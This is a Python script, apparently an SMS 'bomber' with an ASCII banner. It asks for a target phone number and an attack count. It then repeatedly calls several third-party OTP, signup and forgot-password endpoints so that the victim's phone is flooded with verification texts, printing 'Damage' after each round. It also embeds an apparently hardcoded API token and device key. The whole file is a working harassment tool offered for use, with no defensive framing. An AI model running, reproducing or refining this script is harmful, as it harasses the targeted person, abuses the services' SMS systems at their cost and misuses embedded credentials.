import requests
from requests.structures import CaseInsensitiveDict

green = '\033[1;32m'
end = '\033[0m'
print (green+"""  _______ _    _ _  _____                                         
 |__   __| |  | (_)/ ____|                                        
    | |  | |__| |_| (___                                          
    | |  |  __  | |\___ \                                         
    | |  | |  | | |____) |                                        
   _|_|_ |_|  |_|_|_____/____   __  __                            
  / ____|      / ____|__   __| |  \/  |                           
 | (___  _   _| (___    | | ___| \  / |                           
  \___ \| | | |\___ \   | |/ _ \ |\/| |                           
  ____) | |_| |____) |  | |  __/ |  | |                           
 |_____/ \__, |_____/___|_|\___|_|  |_|                           
  / ____| __/ |     |__   __|                                     
 | |     |___/___  __ _| | ___  _ __                              
 | |    | '__/ _ \/ _` | |/ _ \| '__|                             
 | |____| | |  __/ (_| | | (_) | |                                
  \_____|_|  \___|\__,_|_|\___/|_|                                
 |  _ \                                                           
 | |_) |_   _                                                     
 |  _ <| | | |                                                    
 | |_) | |_| |                                                    
 |____/ \__, |                                                    
         __/ |                                                    
   __  _|___/ _____         _____ _    _       _  ___ ____   __   
  / / | |  | |  __ \       / ____| |  | |     | |/ (_)  _ \  \ \  
 | |  | |__| | |  | |_____| (___ | |__| | __ _| ' / _| |_) |  | | 
 | |  |  __  | |  | |______\___ \|  __  |/ _` |  < | |  _ <   | | 
 | |  | |  | | |__| |      ____) | |  | | (_| | . \| | |_) |  | | 
 | |  |_|  |_|_____/      |_____/|_|  |_|\__,_|_|\_\_|____/   | | 
  \_\                                                        /_/  
                                                                  """+end)

# CVALUE
blue = '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan = "\033[96m"
end = '\033[0m'
print ("\033[32m")

print ("	 -!-!- WeLcOmE-!-!- ( HD-SHaKiiB ) ( GhOsToFKiinG ) ")

number  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar aTTack NumBer DiN: "))

message=str(input('[>] Enter Your Target SmaLL Message:'))


amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))

url2 = "http://oncapp.xyz/app/v1/user/user_auth.php?otp_send=123456&mobile="+number

url3 = "http://13.250.248.255/ami_probashi_api_v6/api/v3/bn/registration/send_otp?api_test=true&device_type=1&device_key=fBxnlOZCTY-WRWXOSheo4w%3AAPA91bFtpzsXyJlrH1QtPJWeic5xdKBw6x46MfK1h7rvUuE7RI8HJlgoPjK5KkuMr6XAcwuvIr9eM9f6SY7b5kBl2VnZnKPXQ4U3YJfqAo7QyUJjSZ9jW_b27AxJEEaTsVoknTebNLls&username=%2B88"+number+"&confirmation=create_new_account"

url4 = "https://mistrimama.com/backend/api/forgot-password"

headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json"

data4 = """
{
  \"phone\": \""""+number+"""\"
}
"""
url5 = "http://52.221.159.98:7070/api/user/forgotpassword/sendOTP?username="+number

url7 = "https://halkhata.io/p/api/with-otp/send/signup"

headers7 = CaseInsensitiveDict()
headers7["Content-Type"] = "application/json"

data7 = """{\"phoneNum\":\""""+number+"""\",\"hash\":[\""""+message+"""\"]}"""

url8 = "http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number

url9 = "https://api.jslglobal.co/user-api/v3/send-otp?phone=%2B88"+number+"&jatri_token=J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"

headers9 = CaseInsensitiveDict()

headers9["Content-Type"]="application/json"


for i in range(amount):

	resp2 = requests.get(url2)
	
	resp3 = requests.post(url3)
	
	resp4 = requests.post(url4, headers=headers4, data=data4)
	
	resp5 = requests.get(url5)
	
	resp7 = requests.post(url7, headers=headers7, data=data7)
	
	resp8 = requests.get(url8)
	
	resp9 = requests.post(url9, headers=headers9)
	
	print(str (i+1)+" Damage \n")

